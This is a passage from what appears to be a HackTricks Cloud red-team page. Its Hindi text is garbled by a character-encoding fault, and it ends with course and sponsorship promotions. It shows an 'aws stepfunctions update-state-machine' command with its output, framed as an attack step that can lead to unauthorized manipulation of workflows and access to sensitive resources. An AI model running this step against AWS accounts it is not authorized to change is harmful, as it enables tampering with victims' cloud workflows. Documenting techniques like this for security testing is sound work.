* **рдХрдорд╛рдВрдб** рдЬреЛ **рд╡реИрдз рд╕реНрдерд┐рддрд┐ рдорд╢реАрди** рдХреЛ **рдЕрдкрдбреЗрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХреА рдЧрдИ:

{% code overflow="wrap" %}
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡**: рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣реЛрдВ рдХрд╛ рдЕрдирдзрд┐рдХреГрдд рдирд┐рд╖реНрдкрд╛рджрди рдФрд░ рд╣реЗрд░рдлреЗрд░ рдФрд░ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ, рдЬреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рдЙрд▓реНрд▓рдВрдШрдиреЛрдВ рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
